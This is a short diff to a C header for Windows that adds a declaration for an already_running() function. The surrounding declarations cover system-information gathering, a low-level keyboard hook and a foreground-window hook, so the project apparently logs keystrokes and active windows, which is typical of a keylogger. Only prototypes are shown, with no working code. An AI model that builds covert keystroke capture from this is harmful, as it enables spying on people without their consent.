@@ -30,6 +30,9 @@ void	get_cpu_info(void);
 void	get_windows_info(void);
 void	get_ram_info(void);
 
+
+int		already_running(void);
+
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 
 void CALLBACK WinForeground(HWINEVENTHOOK hWinEventHook, // Handle to the event hook
